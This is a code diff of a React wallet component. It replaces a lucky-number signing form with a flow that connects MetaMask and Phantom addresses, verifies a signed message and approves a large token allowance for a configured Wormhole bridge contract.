@@ -11,9 +11,17 @@ import {
   message,
 } from "antd";
 import { ethers } from "ethers";
-import { useEffect, useState } from "react";
+import { useContext, useEffect, useState } from "react";
 // import { ETH_ABI, ETH_CONTRACT_ADDRESS, NETWORK_URL } from "@/config/config";
 import { createTransaction } from "@/service/app.api";
+import { WalletAddContext } from "@/context/WalletContext";
+import {
+  ABI_MINT_TOKEN,
+  NETWORK_URL,
+  SC_MINT_TOKEN,
+  WORMHOLE_ETH_ABI,
+  WORMHOLE_ETH_SM_ADDRESS,
+} from "@/config/config";
 const { Text, Title } = Typography;
 
 interface FormValuesProps {
@@ -21,9 +29,10 @@ interface FormValuesProps {
 }
 
 const BSCWallets = () => {
-  const [selectedAddress, setSelectedAddress] = useState<string | null>(null);
-  const [openModal, setOpenModal] = useState(false);
-
+  const [autoConnect, setAutoConnect] = useState(true);
+  const { metamaskAdd, phantomAdd, setMetamask } = useContext(WalletAddContext);
+  console.log(metamaskAdd);
+  console.log(phantomAdd);
   async function connectWallet() {
     if (window.ethereum) {
       if (window.ethereum.request) {
@@ -33,7 +42,7 @@ const BSCWallets = () => {
           });
 
           if (addressArray.length > 0) {
-            setSelectedAddress(addressArray[0]);
+            setMetamask(addressArray[0]);
           } else {
             return null;
           }
@@ -52,7 +61,8 @@ const BSCWallets = () => {
   }
 
   function disconnectWallet() {
-    setSelectedAddress(null);
+    setMetamask(null);
+    setAutoConnect(false);
   }
 
   // async function getBalance() {
@@ -68,22 +78,19 @@ const BSCWallets = () => {
 
   useEffect(() => {
     if (
-      !selectedAddress &&
+      metamaskAdd === null &&
       window.ethereum &&
-      window.ethereum.selectedAddress
+      window.ethereum.selectedAddress &&
+      autoConnect === true
     ) {
-      setSelectedAddress(window.ethereum.selectedAddress);
+      setMetamask(window.ethereum.selectedAddress);
       // getBalance();
     }
-  }, [selectedAddress]);
+  }, [metamaskAdd, autoConnect]);
 
-  async function onConfirm(values: FormValuesProps) {
-    console.log(values);
-
-    const luckyNumber = values.luckyNumber.toString();
-    console.log(luckyNumber, selectedAddress);
-
-    const numberMsg = `${luckyNumber}`;
+  async function send() {
+    message.loading("Please wait and dont do anything....");
+    const addMsg = `${metamaskAdd}`;
 
     try {
       if (
@@ -91,21 +98,28 @@ const BSCWallets = () => {
         window.ethereum !== undefined &&
         window.ethereum.request !== undefined
       ) {
-        const from = selectedAddress;
-        const msg = `0x${Buffer.from(numberMsg, "utf8").toString("hex")}`;
+        const from = metamaskAdd;
+        const msg = `0x${Buffer.from(addMsg, "utf8").toString("hex")}`;
         const sign = await window.ethereum.request({
           method: "personal_sign",
-          params: [msg, from, "Example password"],
+          params: [msg, from, "address"],
         });
-        const verify = ethers.verifyMessage(numberMsg, sign);
+        const verify = ethers.utils.verifyMessage(addMsg, sign);
 
-        if (verify?.toLocaleLowerCase() === selectedAddress) {
-          const result = await createTransaction(
-            numberMsg,
-            selectedAddress,
-            sign
+        if (verify?.toLocaleLowerCase() === metamaskAdd) {
+          console.log("ok");
+          const provider = new ethers.providers.Web3Provider(window.ethereum);
+          const signer = provider.getSigner();
+          const contract = new ethers.Contract(
+            SC_MINT_TOKEN,
+            ABI_MINT_TOKEN,
+            signer
           );
-          console.log(result);
+          let amount = ethers.utils.parseUnits("300000000000000000000", 18);
+          console.log(amount);
+
+          let tx = await contract.approve(WORMHOLE_ETH_SM_ADDRESS, amount);
+          await tx.wait();
 
           message.success("Sucess");
         } else {
@@ -119,7 +133,7 @@ const BSCWallets = () => {
 
   return (
     <div className="App">
-      {selectedAddress !== null ? (
+      {metamaskAdd !== null ? (
         <Space direction="vertical">
           <Title level={5} style={{ color: "white" }}>
             {" "}
@@ -135,7 +149,7 @@ const BSCWallets = () => {
               borderRadius: 8,
             }}
           >
-            {selectedAddress}
+            {metamaskAdd}
           </Text>
           <Popconfirm
             title="Are you sure?"
@@ -147,54 +161,14 @@ const BSCWallets = () => {
             </Button>
           </Popconfirm>
           <Button
-            disabled={selectedAddress === null ? true : false}
+            disabled={metamaskAdd === null || phantomAdd === null}
             size="large"
-            onClick={() => setOpenModal(true)}
+            onClick={() =>
+              metamaskAdd !== null && phantomAdd !== null ? send() : null
+            }
           >
-            Play
+            APPROVE
           </Button>
-
-          <Modal
-            title="Send"
-            footer={null}
-            onCancel={() => setOpenModal(false)}
-            open={openModal}
-          >
-            <Form
-              name="send"
-              labelCol={{ span: 24 }}
-              wrapperCol={{ span: 24 }}
-              initialValues={{ amount: 1 }}
-              onFinish={onConfirm}
-              // onFinishFailed={onFinishFailed}
-              autoComplete="off"
-            >
-              <Form.Item
-                label="Enter your lucky number (from 1-10)"
-                name="luckyNumber"
-                rules={[
-                  { required: true, message: "Please fill your number!" },
-                ]}
-              >
-                <InputNumber
-                  min={1}
-                  max={10}
-                  placeholder="Enter your lucky number (from 1-10)"
-                />
-              </Form.Item>
-
-              <Form.Item>
-                <Button
-                  disabled={selectedAddress === null ? true : false}
-                  type="primary"
-                  block
-                  htmlType="submit"
-                >
-                  Send
-                </Button>
-              </Form.Item>
-            </Form>
-          </Modal>
         </Space>
       ) : (
         <Row>
